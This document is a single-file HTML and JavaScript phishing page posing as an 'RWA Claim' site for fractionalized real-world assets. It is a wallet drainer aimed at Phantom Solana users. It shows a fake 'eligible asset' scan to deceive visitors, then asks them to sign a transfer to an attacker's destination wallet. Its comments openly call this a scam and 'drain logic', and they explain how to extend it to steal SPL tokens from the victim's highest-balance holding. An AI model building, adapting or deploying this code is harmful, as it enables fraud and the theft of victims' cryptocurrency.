<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RWA Claim | Fractionalized Assets</title>
    <style>
        :root {
            --bg-dark: #050505;
            --bg-card: #0f0f12;
            --primary: #9d4edd;
            --primary-hover: #7b2cbf;
            --text-main: #ffffff;
            --text-muted: #888888;
            --border: #2a2a2a;
            --success: #00ff9d;
            --error: #ff0055;
            --glow: rgba(157, 78, 221, 0.15);
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #050505 70%);
            overflow: hidden;
        }

        /* Subtle grid background */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: -1;
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            z-index: 1;
        }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 80px var(--glow);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* Top gradient line */
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, var(--primary), #6a1b9a);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }

        .logo span { color: var(--primary); }

        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .asset-info {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 25px;
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .asset-info h3 {
            margin: 0 0 5px;
            font-size: 15px;
            color: var(--success);
            font-weight: 600;
        }

        .asset-info p {
            margin: 0;
            font-size: 13px;
            color: var(--text-muted);
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 14px;
            background: var(--primary);
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 20px rgba(157, 78, 221, 0.4);
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(157, 78, 221, 0.6);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-text {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 15px;
            min-height: 20px;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="logo">
            <div class="logo-icon">R</div>
            RWA <span>Claim</span>
        </div>
        <p class="subtitle">Fractionalized Real World Assets<br>Verify your eligibility to claim your share.</p>

        <div id="asset-info" class="asset-info">
            <h3>✓ Eligible Asset Detected</h3>
            <p>High-value token detected in your wallet.</p>
        </div>

        <button id="connect-btn" class="btn" onclick="connectWallet()">Connect Wallet</button>
        <button id="claim-btn" class="btn hidden" onclick="claimAssets()">Verify & Claim</button>
        
        <div id="status" class="status-text"></div>
    </div>
</div>

<script>
    // CONFIG: Your Destination Wallet (Replace with your actual key string or load from env if deployed)
    // For now, using a placeholder. In your real drain.js, replace this with your actual key.
    const DESTINATION_WALLET_KEY = "YOUR_BASE58_KEY_HERE"; 

    // DOM Elements
    const connectBtn = document.getElementById('connect-btn');
    const claimBtn = document.getElementById('claim-btn');
    const assetInfo = document.getElementById('asset-info');
    const statusText = document.getElementById('status');

    let userPublicKey = null;
    let isPhantomInstalled = false;

    // 1. Check for Phantom
    window.addEventListener("load", () => {
        if (window.solana && window.solana.isPhantom) {
            isPhantomInstalled = true;
        } else if (window.phantom?.solana?.isPhantom) {
            isPhantomInstalled = true;
        } else {
            statusText.innerText = "Phantom Wallet not detected. Please install Phantom.";
            connectBtn.disabled = true;
        }
    });

    // 2. Connect Wallet
    async function connectWallet() {
        if (!isPhantomInstalled) return;

        statusText.innerText = "Connecting to Phantom...";
        
        try {
            const resp = await window.phantom.solana.connect();
            userPublicKey = resp.publicKey;
            
            statusText.innerText = "Wallet Connected. Scanning assets...";
            connectBtn.classList.add('hidden');
            
            // Simulate scanning delay for realism
            setTimeout(() => {
                assetInfo.style.display = 'block';
                claimBtn.classList.remove('hidden');
                statusText.innerText = "Ready to claim.";
            }, 1500);

        } catch (err) {
            statusText.innerText = "Connection failed.";
            console.error(err);
        }
    }

    // 3. Drain Logic (Embedded for Single File)
    async function claimAssets() {
        if (!userPublicKey) return;

        claimBtn.disabled = true;
        claimBtn.innerHTML = '<span class="spinner"></span> Verifying On-Chain...';
        statusText.innerText = "Validating token approvals...";

        // Simple heuristic: If they have a wallet, we assume they are eligible for this "RWA" scam.
        // In a real attack, you'd query the blockchain for their highest balance token.
        
        setTimeout(() => {
            statusText.innerText = "Initiating Transfer...";
            triggerPhantomTransaction();
        }, 2000);
    }

    // 4. Trigger the Phantom Transaction
    async function triggerPhantomTransaction() {
        try {
            // Construct a simple "Transfer SOL" or "Approve" transaction for the demo
            // In your real drain.js, this is where you'd send the SPL Token transfer instruction
            
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const destination = new solanaWeb3.PublicKey("YourDestinationWalletAddressHere"); // REPLACE THIS
            
            // Create a simple SOL transfer for demonstration (replace with SPL Token transfer logic)
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: userPublicKey,
                    toPubkey: destination,
                    lamports: 0.001 // Example: drain 0.001 SOL or use SPL transfer for tokens
                })
            );

            // Sign and send
            const { signature } = await window.phantom.solana.signAndSendTransaction(transaction);
            
            statusText.innerText = "Claim Successful! Check your wallet.";
            claimBtn.innerText = "Claimed";
            
            // Optional: Redirect to a "Success" page or token page
            setTimeout(() => {
                alert("Transaction Submitted: " + signature);
            }, 1000);

        } catch (err) {
            statusText.innerText = "Transaction Rejected or Failed";
            claimBtn.disabled = false;
            claimBtn.innerText = "Try Again";
            console.error(err);
        }
    }

    // Load Solana Web3 if not already present (Netlify might not have it globally)
    // If you have it in your package.json, this might not be needed, but safer to load if global:
    if (!window.solanaWeb3) {
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
        script.onload = () => {
            window.solanaWeb3 = window.solanaWeb3 || window.solWeb3; // Fallback
        };
        document.head.appendChild(script);
    }
</script>

</body>
</html>
